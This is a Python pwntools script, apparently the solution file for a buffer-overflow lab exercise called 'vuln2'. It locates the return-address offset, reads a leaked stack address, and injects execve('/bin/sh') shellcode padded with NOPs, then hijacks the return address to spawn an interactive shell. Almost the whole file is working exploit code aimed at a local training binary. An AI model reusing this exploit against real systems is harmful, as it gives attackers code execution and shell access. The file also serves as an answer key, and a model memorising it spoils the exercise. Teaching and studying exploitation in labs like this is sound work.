#!/usr/bin/env python3
"""Solution for vuln2: return-to-stack -- inject shellcode and return into buf.

Key pwntools:
  shellcraft.sh() + asm() : execve("/bin/sh") shellcode bytes
  p32(addr)               : return address as little-endian 4 bytes
  recvline / int(...,16)  : parse the buf address the program leaks

Layout inside buf:
  [ shellcode ][ NOP padding .......... ][ return addr = start of buf ]
  We return to the start of buf, straight into the shellcode. The shellcode
  sits at the BOTTOM of buf (low address) on purpose: when main returns, ESP
  is just above buf and its pushes grow downward, so shellcode at the top
  (next to ESP) would clobber its own tail before executing. At the bottom it
  stays clear. (The NOP padding is just filler to reach the return address.)

Run:  cd example3 && make && python3 solution3/solve_vuln2.py

To confirm control first, replace the shellcode with asm('jmp $') -- if the
program hangs (infinite loop) you have hijacked the return address.
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "vuln2")


def find_offset():
    """Use cyclic + core dump to get the buf -> return address offset."""
    io = process(BIN)
    io.recvuntil(b"payload:\n")
    io.sendline(cyclic(400))
    io.wait()
    off = cyclic_find(io.corefile.eip)
    io.close()
    log.success("offset(buf -> return address) = %d", off)
    return off


def main():
    offset = find_offset()

    io = process(BIN)
    leak = io.recvline_startswith(b"buf is at ")
    buf_addr = int(leak.split()[-1], 16)
    log.success("leaked buf @ %#x", buf_addr)
    io.recvuntil(b"payload:\n")

    shellcode = asm(shellcraft.sh())          # execve("/bin/sh", 0, 0)
    # Shellcode goes at the START of buf, NOP padding after it. ESP sits just
    # ABOVE buf when main returns, so its pushes grow DOWN toward buf's top --
    # shellcode at the top (adjacent to ESP) would overwrite its own tail
    # before it runs. Placing it at the bottom keeps it clear of ESP.
    payload = shellcode + b"\x90" * (offset - len(shellcode))
    assert len(payload) == offset, "shellcode larger than the buffer"
    payload += p32(buf_addr)                   # return to buf start = shellcode

    io.sendline(payload)
    log.success("shellcode injected -- checking for a shell")
    io.sendline(b"id; uname -a; echo PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
